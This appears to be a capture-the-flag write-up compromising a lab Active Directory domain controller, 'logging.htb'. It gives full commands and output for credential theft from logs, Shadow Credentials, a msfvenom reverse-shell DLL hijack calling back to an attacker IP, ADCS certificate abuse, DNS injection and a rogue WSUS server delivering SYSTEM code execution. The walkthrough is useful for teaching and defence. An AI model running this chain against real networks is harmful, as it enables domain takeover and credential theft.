01 Reconnaissance

Standard nmap scan reveals a Windows Domain Controller exposing the usual AD services: DNS, Kerberos, LDAP, SMB, and WinRM. The hostname DC01.logging.htb and domain logging.htb are confirmed from the SMB banner.

nmap
$ nmap -sC -sV -oN scan.txt 10.129.x.x 53/tcp open domain Simple DNS Plus 88/tcp open kerberos-sec Microsoft Windows Kerberos 135/tcp open msrpc 139/tcp open netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP 445/tcp open microsoft-ds 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (WinRM)
finding: Standard DC port layout. WinRM open means any valid domain credentials can yield a shell. SMB anonymous access grants read on a Logs share.
02 Enumeration — Credential Leak in Log Files

Anonymous SMB enumeration reveals a readable Logs share. Pulling IdentitySync_Trace_20260219.log exposes a verbose debug dump of a failed LDAP bind — including plaintext credentials for svc_recovery.

smbclient
$ smbclient //10.129.x.x/Logs -N smb: \> get IdentitySync_Trace_20260219.log $ grep -i "bindpass\|password\|cred" IdentitySync_Trace_20260219.log VERBOSE - ConnectionContext Dump: { BindUser: "LOGGING\svc_recovery", BindPass: "Em3rg3ncyPa$$2025" }

The password had been rotated — the log shows a failed bind with the old password. The current password Em3rg3ncyPa$$2026 was discovered by trying the year-incremented variant, which authenticated successfully via CrackMapExec. The account has STATUS_ACCOUNT_RESTRICTION on NTLM — Kerberos only.

getTGT
$ faketime -f "+7h" impacket-getTGT logging.htb/svc_recovery:'Em3rg3ncyPa$$2026' -dc-ip 10.129.x.x [*] Saving ticket in svc_recovery.ccache
clock skew: The DC has a ~7-hour offset. All Kerberos operations require faketime -f "+7h" as a prefix, or absolute timestamps for reliability.

BloodHound enumeration with svc_recovery reveals the account is a member of Emergency Recovery and has GenericWrite on the gMSA msa_health$.

finding: svc_recovery → GenericWrite → msa_health$ (gMSA). GenericWrite on a gMSA allows writing msDS-KeyCredentialLink, enabling Shadow Credentials.
03 Shadow Credentials → msa_health$ NT Hash

With GenericWrite on msa_health$, we can write to msDS-KeyCredentialLink and perform a Shadow Credentials attack — adding a certificate that allows PKINIT authentication without knowing the account's password.

pywhisker
$ KRB5CCNAME=svc_recovery.ccache faketime -f "+7h" \ python3 pywhisker.py -d logging.htb -u SVC_recovery -k \ --target 'msa_health$' --action add --filename msa_shadow [+] Updated the msDS-KeyCredentialLink attribute of the target object [*] Must be used with password: E9ro5LVbhkd1yV3w2Wt0 [*] Saved PFX to: msa_shadow.pfx

Use PKINITtools to request a TGT for msa_health$ via the certificate, then extract the NT hash via U2U (User-to-User Kerberos).

PKINITtools
$ faketime -f "+7h" python3 gettgtpkinit.py \ -cert-pfx msa_shadow.pfx -pfx-pass 'E9ro5LVbhkd1yV3w2Wt0' \ logging.htb/'msa_health$' msa_health.ccache [*] AS-REP encryption key: 937f6683e38e0c434a22492f7f5b2be919c5ca45bf49cab642e05024252af4db $ KRB5CCNAME=msa_health.ccache faketime -f "+7h" \ python3 getnthash.py logging.htb/'msa_health$' \ -key 937f6683e38e0c434a22492f7f5b2be919c5ca45bf49cab642e05024252af4db [*] Got hash for 'msa_health$': aad3b435b51404eeaad3b435b51404ee:603fc24ee01a9409f83c9d1d701485c5

04 DLL Hijack via Scheduled Task → jaylee.clifton

Enumeration of msa_health$'s home directory reveals monitor.ps1 — a script that monitors the UpdateChecker Agent scheduled task. Reading the task XML shows it runs as jaylee.clifton every 3 minutes and executes UpdateMonitor.exe.

Decompiling UpdateMonitor.exe with ilspycmd reveals the exact attack path: the binary checks for C:\ProgramData\UpdateMonitor\Settings_Update.zip. If found, it extracts the contents into C:\Program Files\UpdateMonitor\bin\ and loads settings_update.dll via LoadLibrary.

decompile + exploit
# Key logic from UpdateMonitor.exe (decompiled) if (File.Exists("C:\ProgramData\UpdateMonitor\Settings_Update.zip")) { File.Delete(text4); // delete old DLL ZipFile.ExtractToDirectory(text, text2); // extract zip to bin\ } LoadLibrary("C:\Program Files\UpdateMonitor\bin\settings_update.dll"); # msa_health$ can write to C:\ProgramData\UpdateMonitor\ (BUILTIN\Users WD) # jaylee (IT group) has full control on bin\ — task extracts as jaylee
$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.15.15 LPORT=4444 \ -f dll -o settings_update.dll
$ zip Settings_Update.zip settings_update.dll
evil-winrm upload + catch
# Upload zip via msa_health$ session
*Evil-WinRM* PS> upload Settings_Update.zip "C:\ProgramData\UpdateMonitor\Settings_Update.zip" # Wait up to 3 minutes for the task to fire...
$ nc -lvnp 4444 C:\Windows\system32> whoami logging\jaylee.clifton
gotcha: The 32-bit DLL payload cannot find 64-bit system binaries like UsoClient.exe due to WOW64 filesystem redirection. Use C:\Windows\Sysnative\cmd.exe to get a 64-bit shell when needed.

jaylee.clifton is a member of the IT group, which has full control (F) on C:\Program Files\UpdateMonitor\bin\. The user flag is on jaylee's Desktop.

05 ADCS Certificate — Minting a Trusted WSUS Cert

Certipy enumeration reveals a custom template UpdateSrv with EnrolleeSuppliesSubject: True and enrollment rights granted to LOGGING\IT. The EKU is Server Authentication only — not Client Authentication — so it cannot be used for Kerberos PKINIT. However, it is exactly what a WSUS HTTPS server needs.

certipy
# Dump jaylee's TGT from reverse shell
C:\> Rubeus.exe tgtdeleg /nowrap
$ impacket-ticketConverter jaylee.kirbi jaylee.clifton.ccache # Request certificate with wsus.logging.htb as SAN
$ KRB5CCNAME=jaylee.clifton.ccache faketime -f "+7h" \ certipy req -u 'jaylee.clifton@logging.htb' -k -no-pass \ -target dc01.logging.htb -dc-ip 10.129.x.x \ -ca 'logging-DC01-CA' -template 'UpdateSrv' \ -dns 'wsus.logging.htb'
[*] Got certificate with DNS Host Name 'wsus.logging.htb' [*] Saved certificate and private key to 'wsus.pfx'

We now hold a certificate for wsus.logging.htb signed by logging-DC01-CA — the internal CA that DC01 trusts for all TLS verification, including WSUS update traffic.

finding: The DC is configured to fetch Windows Updates from https://wsus.logging.htb:8531 (confirmed via registry key HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\WUServer). The hostname does not exist in DNS yet.
06 DNS Record Injection + Rogue WSUS Server → SYSTEM

svc_recovery has CREATE_CHILD on the AD-integrated DNS zone. We add an A record for wsus pointing to our Kali machine — no ARP spoofing needed, pure AD-level DNS injection.

dnstool
$ KRB5CCNAME=svc_recovery.ccache faketime -f "+7h" \ python3 krbrelayx/dnstool.py \ -u 'logging.htb\svc_recovery' -k \ -r wsus -a add -d 10.10.15.15 \ -dns-ip 10.129.x.x dc01.logging.htb [+] LDAP operation completed successfully

With DNS in place and our trusted certificate ready, we stand up a rogue WSUS server using wsuks. Unlike pywsus, wsuks uses a minimal sync-updates.xml without Windows product category prerequisites — meaning the DC's update agent follows through to GetExtendedUpdateInfo and downloads the payload.

Wsuks_payload.py
# Prepare certs and payload
$ openssl pkcs12 -in wsus.pfx -out /tmp/wsus_cert.pem -clcerts -nokeys -passin pass:
$ openssl pkcs12 -in wsus.pfx -out /tmp/wsus_key.pem -nocerts -nodes -passin pass:
$ wget https://live.sysinternals.com/tools/PsExec64.exe -O /tmp/PsExec64.exe # Wsuks_payload.py — stub ARP module, serve HTTPS WSUS on 8531
$ python3 Wsuks_payload.py [*] HTTP content on 10.10.15.15:8530 [*] HTTPS WSUS on 10.10.15.15:8531

Trigger the Windows Update scan from the msa_health$ WinRM session (64-bit context), which causes DC01 to contact our rogue WSUS server.

trigger + WSUS handshake
*Evil-WinRM* PS> C:\Windows\System32\UsoClient.exe StartScan # wsuks terminal catches the full handshake: [+] POST /ClientWebService/client.asmx — GetConfig [+] POST /ClientWebService/client.asmx — GetCookie [+] POST /ClientWebService/client.asmx — SyncUpdates [+] POST /ClientWebService/client.asmx — GetExtendedUpdateInfo [+] GET /<uuid>/PsExec64.exe [+] GET /<uuid>/PsExec64.exe

PsExec64 is executed as SYSTEM by the Windows Update agent with the command we specified: /accepteula /s cmd.exe /c "net localgroup administrators msa_health$ /add". Re-authenticating via WinRM picks up the new token with local admin rights.

07 Summary
attack chain:

SMB anonymous read → plaintext creds in IdentitySync_Trace log (svc_recovery) → GenericWrite on msa_health$ → Shadow Credentials (pywhisker + PKINITtools) → NT hash → Evil-WinRM as msa_health$ → Decompile UpdateMonitor.exe → zip-based DLL hijack via C:\ProgramData\UpdateMonitor\ → Reverse shell as jaylee.clifton (IT group) → Enroll UpdateSrv ADCS template with wsus.logging.htb SAN → Inject DNS A record via svc_recovery (CREATE_CHILD on DNS zone) → Rogue WSUS server (wsuks + stunnel TLS) serving malicious PsExec64 update → UsoClient StartScan triggers DC to download and execute payload as SYSTEM → msa_health$ added to local Administrators → root.txt from toby.brynleigh\Desktop

Key takeaways:

Log hygiene is a credential store. The IdentitySync_Trace log contained a plaintext LDAP bind password in a verbose debug dump — readable over anonymous SMB. This single leak was the root of the entire chain.

GenericWrite on a gMSA equals its password. Shadow Credentials abuse via msDS-KeyCredentialLink lets any principal with GenericWrite authenticate as the gMSA without ever needing to read msDS-ManagedPassword.

Scheduled task input directories are impersonation primitives. A zip drop into a writable directory that a privileged task unpacks is functionally equivalent to writing to that task's execution context. The key was identifying the writable path (C:\ProgramData\UpdateMonitor\) vs. the privileged extraction target (bin\).

Server Authentication EKU ≠ PKINIT, but it does equal WSUS trust. The UpdateSrv template was not exploitable via standard ESC1 Kerberos paths, but it was exactly the primitive needed to impersonate the WSUS HTTPS endpoint the DC trusts.

pywsus fails silently on Server 2019 DCs. pywsus advertises updates under product categories the server OS isn't enrolled in. The client logs "0 updates detected" and never calls GetExtendedUpdateInfo. wsuks uses a simpler sync XML that the DC follows through.

DNS CREATE_CHILD rights + no ARP needed. Authenticated Users can create DNS nodes in AD-integrated zones by default. A machine account (or any authenticated user with the right) can point any hostname at attacker infrastructure purely through LDAP — no layer-2 access required.
